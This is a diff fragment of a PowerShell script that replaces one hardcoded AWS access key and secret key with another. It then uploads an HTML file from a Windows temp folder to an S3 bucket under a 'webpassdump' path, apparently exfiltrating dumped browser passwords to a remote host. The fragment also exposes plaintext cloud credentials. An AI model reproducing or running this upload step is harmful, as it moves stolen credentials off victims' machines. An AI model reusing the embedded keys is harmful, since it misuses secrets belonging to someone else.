@@ -109,6 +109,6 @@ Import-Module -Name AWS.Tools.S3
 timeout 5
 
 #Setup Credential for cloud storage AWS S3
-Set-AWSCredential -AccessKey AKIAV6ZQELF5ADIC4QXW -SecretKey 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 -StoreAs default
+Set-AWSCredential -AccessKey AKIAV6ZQELF5BZBJLC27 -SecretKey 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 -StoreAs default
 Get-S3Bucket  -BucketName rmmoutputs
 Write-S3Object -BucketName "rmmoutputs" -Key "$File.html" -File "C:\Windows\Temp\JuansFamousFriedChicken\$File.html" -EndpointUrl "https://rmmoutputs.s3.amazonaws.com/webpassdump/$File.html" -Region "us-east-1"
